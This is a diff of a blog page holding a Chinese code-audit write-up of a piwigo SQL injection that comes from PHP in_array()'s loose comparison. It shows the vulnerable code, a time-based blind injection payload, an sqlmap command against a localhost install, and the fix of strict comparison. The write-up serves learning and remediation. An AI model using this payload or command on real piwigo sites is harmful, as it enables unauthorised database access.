@@ -8,19 +8,20 @@
   <link rel="dns-prefetch" href="http://yoursite.com">
   <title>PHP代码审计之piwigo SQL injection（in_array()函数缺陷） | Hit0n&#39;s bolg</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="前言最近在看代码审计，红日安全在先知社区上发了一个比较好的项目，打算花点时间把上面的项目全部复现一遍。附上链接：代码审计Day1 - in_array函数缺陷 审计知识准备先来看看in_array()函数。in_array函数判断$needle是否在数组中，$strict默认情况下设置为false，当设置为false是使用的是“==”进行判断，设置为true时使用的是“===”进行判断。=== 在">
+  <meta name="description" content="前言最近在看代码审计，红日安全在先知社区上发了一个比较好的项目，打算花点时间把上面的项目全部复现一遍。附上链接：代码审计Day1 - in_array函数缺陷">
+<meta name="keywords" content="代码审计">
 <meta property="og:type" content="article">
 <meta property="og:title" content="PHP代码审计之piwigo SQL injection（in_array()函数缺陷）">
 <meta property="og:url" content="http://yoursite.com/2018/10/25/PHP代码审计之piwigo SQL injection（in_array()函数缺陷）/index.html">
 <meta property="og:site_name" content="Hit0n&#39;s bolg">
-<meta property="og:description" content="前言最近在看代码审计，红日安全在先知社区上发了一个比较好的项目，打算花点时间把上面的项目全部复现一遍。附上链接：代码审计Day1 - in_array函数缺陷 审计知识准备先来看看in_array()函数。in_array函数判断$needle是否在数组中，$strict默认情况下设置为false，当设置为false是使用的是“==”进行判断，设置为true时使用的是“===”进行判断。=== 在">
+<meta property="og:description" content="前言最近在看代码审计，红日安全在先知社区上发了一个比较好的项目，打算花点时间把上面的项目全部复现一遍。附上链接：代码审计Day1 - in_array函数缺陷">
 <meta property="og:locale" content="zh">
 <meta property="og:image" content="https://i.imgur.com/RmXyLYr.png">
 <meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180731092236-352cbc9e-9460-1.png">
-<meta property="og:updated_time" content="2018-10-25T13:36:26.874Z">
+<meta property="og:updated_time" content="2018-11-12T08:37:49.011Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="PHP代码审计之piwigo SQL injection（in_array()函数缺陷）">
-<meta name="twitter:description" content="前言最近在看代码审计，红日安全在先知社区上发了一个比较好的项目，打算花点时间把上面的项目全部复现一遍。附上链接：代码审计Day1 - in_array函数缺陷 审计知识准备先来看看in_array()函数。in_array函数判断$needle是否在数组中，$strict默认情况下设置为false，当设置为false是使用的是“==”进行判断，设置为true时使用的是“===”进行判断。=== 在">
+<meta name="twitter:description" content="前言最近在看代码审计，红日安全在先知社区上发了一个比较好的项目，打算花点时间把上面的项目全部复现一遍。附上链接：代码审计Day1 - in_array函数缺陷">
 <meta name="twitter:image" content="https://i.imgur.com/RmXyLYr.png">
   
     <link rel="alternative" href="/atom.xml" title="Hit0n&#39;s bolg" type="application/atom+xml">
@@ -160,20 +161,40 @@
         <a href="/2018/10/25/PHP代码审计之piwigo SQL injection（in_array()函数缺陷）/" class="archive-article-date">
   	<time datetime="2018-10-25T10:34:18.648Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-25</time>
 </a>
+		
+          <div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <span class="post-count">816字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">3分</span>
+      </span>
+    </span>
+</div>
+          
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近在看代码审计，红日安全在先知社区上发了一个比较好的项目，打算花点时间把上面的项目全部复现一遍。附上链接：<a href="https://xz.aliyun.com/t/2451" target="_blank" rel="noopener">代码审计Day1 - in_array函数缺陷</a></p>
-<h3 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h3><h4 id="知识准备"><a href="#知识准备" class="headerlink" title="知识准备"></a>知识准备</h4><p>先来看看in_array()函数。<br><img src="https://i.imgur.com/RmXyLYr.png" alt=""><br>in_array函数判断$needle是否在数组中，$strict默认情况下设置为false，当设置为false是使用的是“==”进行判断，设置为true时使用的是“===”进行判断。<br><br>=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较。<br><br>== 在进行比较的时候，会先将字符串类型转化成相同，再比较。<br>看下以下代码就知道是怎么回事了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$arry = [0,1,2,&apos;3&apos;];</span><br><span class="line">var_dump(1==&apos;1&apos;);  //true</span><br><span class="line">var_dump(1==&apos;12cac&apos;);  //false</span><br><span class="line">var_dump(0==&apos;casdcsd&apos;);  //true</span><br><span class="line">var_dump(0===&apos;1vdf&apos;);  //false</span><br><span class="line">var_dump(0===&apos;csdv&apos;);  //false</span><br><span class="line">var_dump(in_array(&apos;abc&apos;,$arry));  //true</span><br><span class="line">var_dump(in_array(&apos;1abc&apos;, $arry,true));  //false</span><br><span class="line">var_dump(in_array(&apos;4&apos;, $arry,true));  //false</span><br><span class="line">var_dump(in_array(1, $arry,true));  //true</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<h4 id="开始审计"><a href="#开始审计" class="headerlink" title="开始审计"></a>开始审计</h4><p>漏洞的位置在：include/functions_rate.inc.php，include/config_default.inc.php，以及根目录下的picture.php。<br>这里只贴上关键代码。<br>先来看include/functions_rate.inc.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">function rate_picture($image_id, $rate)</span><br><span class="line">&#123;</span><br><span class="line">  global $conf, $user;</span><br><span class="line"></span><br><span class="line">  if (!isset($rate)</span><br><span class="line">      or !$conf[&apos;rate&apos;]</span><br><span class="line">      or !in_array($rate, $conf[&apos;rate_items&apos;]))</span><br><span class="line">  &#123;</span><br><span class="line">    return false;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">......省略部分</span><br><span class="line"></span><br><span class="line">if ($user_anonymous)</span><br><span class="line">  &#123;</span><br><span class="line">    $query.= &apos; AND anonymous_id = \&apos;&apos;.$anonymous_id.&apos;\&apos;&apos;;</span><br><span class="line">  &#125;</span><br><span class="line">  pwg_query($query);</span><br><span class="line">  $query = &apos;</span><br><span class="line">INSERT</span><br><span class="line">  INTO &apos;.RATE_TABLE.&apos;</span><br><span class="line">  (user_id,anonymous_id,element_id,rate,date)</span><br><span class="line">  VALUES</span><br><span class="line">  (&apos;</span><br><span class="line">    .$user[&apos;id&apos;].&apos;,&apos;</span><br><span class="line">    .&apos;\&apos;&apos;.$anonymous_id.&apos;\&apos;,&apos;</span><br><span class="line">    .$image_id.&apos;,&apos;</span><br><span class="line">    .$rate</span><br><span class="line">    .&apos;,NOW())</span><br></pre></td></tr></table></figure></p>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在看代码审计，红日安全在先知社区上发了一个比较好的项目，打算花点时间把上面的项目全部<br>复现一遍。附上链接：<a href="https://xz.aliyun.com/t/2451" target="_blank" rel="noopener">代码审计Day1 - in_array函数缺陷</a><br><a id="more"></a></p>
+<h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><h3 id="知识准备"><a href="#知识准备" class="headerlink" title="知识准备"></a>知识准备</h3><p>先来看看in_array()函数。<br><img src="https://i.imgur.com/RmXyLYr.png" alt=""><br>in_array函数判断$needle是否在数组中，$strict默认情况下设置为false，当设置为false是使用的是“==”进行判断，设置为true时使用的是“===”进行判断。<br><br>=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较。<br><br>== 在进行比较的时候，会先将字符串类型转化成相同，再比较。<br>看下以下代码就知道是怎么回事了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$arry = [0,1,2,&apos;3&apos;];</span><br><span class="line">var_dump(1==&apos;1&apos;);  //true</span><br><span class="line">var_dump(1==&apos;12cac&apos;);  //false</span><br><span class="line">var_dump(0==&apos;casdcsd&apos;);  //true</span><br><span class="line">var_dump(0===&apos;1vdf&apos;);  //false</span><br><span class="line">var_dump(0===&apos;csdv&apos;);  //false</span><br><span class="line">var_dump(in_array(&apos;abc&apos;,$arry));  //true</span><br><span class="line">var_dump(in_array(&apos;1abc&apos;, $arry,true));  //false</span><br><span class="line">var_dump(in_array(&apos;4&apos;, $arry,true));  //false</span><br><span class="line">var_dump(in_array(1, $arry,true));  //true</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<h3 id="开始审计"><a href="#开始审计" class="headerlink" title="开始审计"></a>开始审计</h3><p>漏洞的位置在：include/functions_rate.inc.php，include/config_default.inc.php，以及根目录下的picture.php。<br>这里只贴上关键代码。<br>先来看include/functions_rate.inc.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">function rate_picture($image_id, $rate)</span><br><span class="line">&#123;</span><br><span class="line">  global $conf, $user;</span><br><span class="line"></span><br><span class="line">  if (!isset($rate)</span><br><span class="line">      or !$conf[&apos;rate&apos;]</span><br><span class="line">      or !in_array($rate, $conf[&apos;rate_items&apos;]))</span><br><span class="line">  &#123;</span><br><span class="line">    return false;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">......省略部分</span><br><span class="line"></span><br><span class="line">if ($user_anonymous)</span><br><span class="line">  &#123;</span><br><span class="line">    $query.= &apos; AND anonymous_id = \&apos;&apos;.$anonymous_id.&apos;\&apos;&apos;;</span><br><span class="line">  &#125;</span><br><span class="line">  pwg_query($query);</span><br><span class="line">  $query = &apos;</span><br><span class="line">INSERT</span><br><span class="line">  INTO &apos;.RATE_TABLE.&apos;</span><br><span class="line">  (user_id,anonymous_id,element_id,rate,date)</span><br><span class="line">  VALUES</span><br><span class="line">  (&apos;</span><br><span class="line">    .$user[&apos;id&apos;].&apos;,&apos;</span><br><span class="line">    .&apos;\&apos;&apos;.$anonymous_id.&apos;\&apos;,&apos;</span><br><span class="line">    .$image_id.&apos;,&apos;</span><br><span class="line">    .$rate</span><br><span class="line">    .&apos;,NOW())</span><br></pre></td></tr></table></figure></p>
 <p>这里的$rate使用in_arrar进行了处理，我们来看下$conf[‘rate_items’]是什么，$conf[‘rate_items’]在include/config_default.inc.php。代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// rate_items: available rates for a picture</span><br><span class="line">$conf[&apos;rate_items&apos;] = array(0,1,2,3,4,5);</span><br></pre></td></tr></table></figure></p>
 <p>而picture.php刚好调用了rate_picture函数，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">define(&apos;PHPWG_ROOT_PATH&apos;,&apos;./&apos;);</span><br><span class="line">include_once(PHPWG_ROOT_PATH.&apos;include/common.inc.php&apos;);</span><br><span class="line">include(PHPWG_ROOT_PATH.&apos;include/section_init.inc.php&apos;);</span><br><span class="line">include_once(PHPWG_ROOT_PATH.&apos;include/functions_picture.inc.php&apos;);</span><br><span class="line"></span><br><span class="line">// Check Access and exit when user status is not ok</span><br><span class="line">check_status(ACCESS_GUEST);</span><br><span class="line"></span><br><span class="line">// access authorization check</span><br><span class="line">if (isset($page[&apos;category&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">  check_restrictions($page[&apos;category&apos;][&apos;id&apos;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$page[&apos;rank_of&apos;] = array_flip($page[&apos;items&apos;]);</span><br><span class="line"></span><br><span class="line">......省略部分</span><br><span class="line">if (isset($_GET[&apos;action&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">  switch ($_GET[&apos;action&apos;])</span><br><span class="line">  &#123;</span><br><span class="line">    case &apos;add_to_favorites&apos; :</span><br><span class="line">    &#123;</span><br><span class="line">      $query = &apos;</span><br><span class="line">INSERT INTO &apos;.FAVORITES_TABLE.&apos;</span><br><span class="line">  (image_id,user_id)</span><br><span class="line">  VALUES</span><br><span class="line">  (&apos;.$page[&apos;image_id&apos;].&apos;,&apos;.$user[&apos;id&apos;].&apos;)</span><br><span class="line">;&apos;;</span><br><span class="line">      pwg_query($query);</span><br><span class="line"></span><br><span class="line">      redirect($url_self);</span><br><span class="line"></span><br><span class="line">      break;</span><br><span class="line">    &#125;</span><br><span class="line">......省略部分</span><br><span class="line"></span><br><span class="line">case &apos;rate&apos; :</span><br><span class="line">    &#123;</span><br><span class="line">      include_once(PHPWG_ROOT_PATH.&apos;include/functions_rate.inc.php&apos;);</span><br><span class="line">      rate_picture($page[&apos;image_id&apos;], $_POST[&apos;rate&apos;]);</span><br><span class="line">      redirect($url_self);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
 <p>现在逻辑就比较清楚了，首先picture.php通过GET方式传入action，action的值是rate.然后传入的rate 的值会被include/functions_rate.inc.php 中的rate_picture这个函数进行检测，由于in_array()函数第三个属性默认为false，函数会对数据进行弱比较。<br>所以我们可以直接构造payload进行绕过造成SQL注入。<br>比如我们将 $rate 的值设置成 1,1 and if(ascii(substr((select database()),1,1))=112,1,sleep(3)));# 那么SQL语句就变成：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO piwigo_rate (user_id,anonymous_id,element_id,rate,date) VALUES (2,&apos;127.0.0&apos;,1,1,1 and if(ascii(substr((select database()),1,1))=112,1,sleep(3)));#,NOW()) ;</span><br></pre></td></tr></table></figure></p>
 <p>这样就可以进行盲注了<br>简化后的代码如下<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180731092236-352cbc9e-9460-1.png" alt=""></p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>直接用sqlmap跑就行了<br>payload：<code>sqlmap -u &quot;http://127.0.0.1/cms/piwigo/picture.php?/2/category/1&amp;action=rate&quot; --data &quot;rate=1&quot; --dbs --batch</code></p>
-<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>将 in_array() 函数的第三个参数设置为 true</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>直接用sqlmap跑就行了<br>payload：<code>sqlmap -u &quot;http://127.0.0.1/cms/piwigo/picture.php?/2/category/1&amp;action=rate&quot; --data &quot;rate=1&quot; --dbs --batch</code></p>
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>将 in_array() 函数的第三个参数设置为 true</p>
 
       
 
@@ -203,6 +224,17 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">代码审计</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
@@ -277,8 +309,8 @@
     </a>
   
   
-    <a href="/2018/10/19/记一次曲折的Linux提权/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">记一次曲折的Linux提权</div>
+    <a href="/2018/09/21/记一次实战渗透过程中的知识点总结/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">记一次实战渗透过程中的知识点总结</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -402,6 +434,30 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
             <input type="checkbox" q-on="click:toggleTag(e)" q-attr="checked:showTags">
           </label>
           <ul class="article-tag-list" q-show="showTags">
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">代码审计</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">python</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">总结</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">实战</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">提权</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">内网</a>
+              </li>
             
             <div class="clearfix"></div>
           </ul>
